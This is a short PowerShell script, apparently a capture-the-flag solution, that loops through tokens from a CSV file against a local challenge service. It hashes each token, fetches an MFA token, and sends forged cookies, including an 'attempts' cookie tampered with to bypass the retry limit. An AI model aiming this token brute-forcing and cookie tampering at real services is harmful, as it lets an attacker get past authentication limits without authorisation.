# Import the CSV file
$csvData = Import-Csv -Path "./csvfile.csv"

# Initialise new web session
$session2 = New-Object Microsoft.PowerShell.Commands.WebRequestSession

# Iterate through each row in the CSV
foreach ($row in $csvData) {
     $token = $row."file_MD5hash"
     Write-Host -NoNewLine "Current Token: $token :   " 
     
     # Process each token to generate hash
     $token > token
     $hash = Get-FileHash ./token -Algorithm SHA256 | Select-Object -ExpandProperty Hash
     $url1 = "http://127.0.0.1:1225/tokens/$hash"
     $session1 = New-Object Microsoft.PowerShell.Commands.WebRequestSession
     $cookie1 = New-Object System.Net.Cookie("token", "$token", "/", "127.0.0.1")
     $session1.Cookies.Add($cookie1)
     
# Generate MFA Token     
     $mfa_token = [regex]::match((Invoke-WebRequest -Uri $url1 -WebSession $session1 -Credential $cred -AllowUnencryptedAuthentication).Content, "href='([^']*)'").Groups[1].Value
     $cookie2 = New-Object System.Net.Cookie("mfa_token", "$mfa_token", "/", "127.0.0.1")
     $url2 = "http://127.0.0.1:1225/mfa_validate/$hash"
# Set “Attempts” Cookie to 10     
     $cookie3 = New-Object System.Net.Cookie("attempts", "c25ha2VvaWwK09", "/", "127.0.0.1")
     $session2.Cookies.Add($cookie1)
     $session2.Cookies.Add($cookie2)
     $session2.Cookies.Add($cookie3)
     
     $Response = (Invoke-WebRequest -Uri $url2 -WebSession $session2 -Credential $cred -AllowUnencryptedAuthentication)
     Write-Host $Response.Content 
}
